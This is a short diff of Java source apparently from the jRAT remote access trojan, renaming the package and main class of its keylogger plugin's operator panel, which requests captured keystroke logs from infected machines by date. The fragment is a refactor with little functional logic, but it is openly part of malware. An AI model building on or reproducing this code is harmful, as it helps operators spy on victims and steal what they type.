@@ -1,4 +1,4 @@
-package pro.jrat.plugin.client.ui;
+package pro.jrat.plugin.keylogger.client.ui;
 
 import java.awt.Color;
 import java.awt.event.ActionEvent;
@@ -30,8 +30,8 @@ import javax.swing.tree.DefaultTreeModel;
 import pro.jrat.api.BaseControlPanel;
 import pro.jrat.api.PacketBuilder;
 import pro.jrat.api.RATObject;
-import pro.jrat.plugin.client.HeartbeatThread;
-import pro.jrat.plugin.client.KeyloggerPlugin;
+import pro.jrat.plugin.keylogger.client.HeartbeatThread;
+import pro.jrat.plugin.keylogger.client.ClientPlugin;
 
 @SuppressWarnings("serial")
 public class PanelKeylogger extends BaseControlPanel {
@@ -122,7 +122,7 @@ public class PanelKeylogger extends BaseControlPanel {
 					final DayTreeNode day = (DayTreeNode)event.getPath().getPath()[3];
 					
 					try {
-						getServer().addToSendQueue(new PacketBuilder(KeyloggerPlugin.LOG_HEADER, getServer()) {
+						getServer().addToSendQueue(new PacketBuilder(ClientPlugin.LOG_HEADER, getServer()) {
 							@Override
 							public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {
 								dos.writeUTF(year.toString());
@@ -143,7 +143,7 @@ public class PanelKeylogger extends BaseControlPanel {
 		StyleConstants.setForeground(title, Color.green.darker());
 
 		try {
-			getServer().addToSendQueue(new PacketBuilder(KeyloggerPlugin.LOGS_HEADER, getServer()) {
+			getServer().addToSendQueue(new PacketBuilder(ClientPlugin.LOGS_HEADER, getServer()) {
 				@Override
 				public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {
 
